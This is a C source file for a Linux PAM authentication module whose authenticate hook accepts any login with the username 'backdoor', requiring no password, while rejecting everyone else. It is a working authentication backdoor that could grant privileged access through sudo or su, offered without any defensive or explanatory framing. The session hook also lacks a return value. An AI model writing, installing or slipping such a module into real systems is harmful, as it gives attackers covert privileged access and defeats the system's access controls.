#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* expected hook */

// Called by PAM when a user needs to be authenticated, for example by running
// the sudo command
PAM_EXTERN int pam_sm_authenticate(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv)
{
	int retval;

	const char *pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS)
	{
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0)
	{
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
	// return identify(pamh, flags, argc, argv, true);
}

// Called by PAM when a session is started, such as by the su command
PAM_EXTERN int pam_sm_open_session(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv)
{
	//   return identify(pamh, flags, argc, argv, false);
}

// These functions below are required by PAM, but not needed in this module

PAM_EXTERN int pam_sm_acct_mgmt(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv) 
{
	return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_close_session(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv) 
{
	return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_chauthtok(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv) 
{
	return PAM_IGNORE;
}
PAM_EXTERN int pam_sm_setcred(
	pam_handle_t *pamh,
	int flags,
	int argc,
	const char **argv) 
{
	return PAM_IGNORE;
}
